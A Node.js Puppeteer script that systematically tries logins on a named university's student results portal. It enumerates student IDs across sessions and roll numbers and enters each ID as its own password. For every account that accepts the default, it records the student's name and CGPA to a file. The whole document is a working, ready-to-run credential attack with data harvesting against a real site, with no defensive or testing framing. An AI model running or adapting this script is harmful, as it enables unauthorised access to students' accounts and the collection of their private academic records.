const puppeteer = require("puppeteer");
const fs = require("fs");
const pLimit = require("p-limit");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const department = "EEE";
const rollStart = 1;
const rollEnd = 999;
const concurrency = 5; // number of parallel pages

const retry = async (fn, retries = 3, delay = 2000) => {
    for (let i = 0; i < retries; i++) {
        try {
            return await fn();
        } catch (err) {
            if (i === retries - 1) throw err;
            console.warn(`⚠️ Retry ${i + 1} due to: ${err.message}`);
            await new Promise(res => setTimeout(res, delay));
        }
    }
};

(async () => {
    const unchanged = [];
    let browser;

    const safeExit = async () => {
        if (browser) await browser.close();
        console.log("\n📋 Final Report:");
        console.table(unchanged);
        fs.writeFileSync("results.json", JSON.stringify(unchanged, null, 2));
        process.exit();
    };

    process.on("SIGINT", safeExit);
    process.on("uncaughtException", async (err) => {
        console.error("💥 Uncaught Exception:", err);
        await safeExit();
    });
    process.on("unhandledRejection", async (reason, promise) => {
        console.error("💥 Unhandled Rejection:", reason);
        await safeExit();
    });

    browser = await puppeteer.launch({ headless: true });

    for (let year = 16; year <= 25; year++) {
        for (const term of ["01", "03"]) {
            const session = `${year}${term}`;
            let failureCount = 0;
            let skipSession = false;

            console.log(`\n🚀 Starting session: ${session}\n`);

            const limit = pLimit(concurrency);
            const tasks = [];

            for (let roll = rollStart; roll <= rollEnd; roll++) {
                const rollCode = `20${String(roll).padStart(3, "0")}`;
                const userId = `${department}${session}${rollCode}`;

                const task = limit(async () => {
                    const page = await browser.newPage();
                    await page.setDefaultNavigationTimeout(20000);

                    try {
                        await retry(() => page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" }));
                        await page.type("#username", userId);
                        await page.type("#password", userId);

                        await Promise.all([
                            page.click("button[type=submit]"),
                            page.waitForNavigation({ waitUntil: "domcontentloaded" })
                        ]);

                        if (page.url().includes("panel")) {
                            console.log(`✅ Login success: ${userId}`);

                            await retry(() => page.goto(`${baseUrl}/panel/overallresult`, {
                                waitUntil: "domcontentloaded"
                            }));

                            const data = await page.evaluate(() => {
                                let name = "Unknown";
                                let cgpa = "N/A";

                                const rows = document.querySelectorAll("table.table-bordered.table-striped tbody tr");

                                rows.forEach(row => {
                                    const ths = row.querySelectorAll("th");
                                    const tds = row.querySelectorAll("td");

                                    for (let i = 0; i < ths.length; i++) {
                                        const label = ths[i].textContent.trim();
                                        if (label === "Name :") {
                                            name = tds[i]?.textContent?.trim() || "Unknown";
                                        }
                                    }
                                });

                                const cgpaMatch = document.body.innerHTML.match(/CGPA\s*:<\/b><\/td>\s*<td[^>]*><b>([\d.]+)<\/b>/);
                                if (cgpaMatch) {
                                    cgpa = cgpaMatch[1];
                                }

                                return { name, cgpa };
                            });

                            unchanged.push({ id: userId, ...data });

                            await retry(() => page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" }));
                        } else {
                            console.log(`❌ Login failed: ${userId}`);
                        }
                    } catch (err) {
                        console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
                    } finally {
                        try {
                            await page.close();
                        } catch (closeErr) {
                            console.warn(`⚠️ Page close failed: ${closeErr.message}`);
                        }
                    }
                });

                tasks.push(task);
            }

            await Promise.all(tasks);

            if (skipSession) break;
        }
    }

    await browser.close();

    console.log("\n📋 Final Report:");
    console.table(unchanged);

    fs.writeFileSync("results.json", JSON.stringify(unchanged, null, 2));
})();
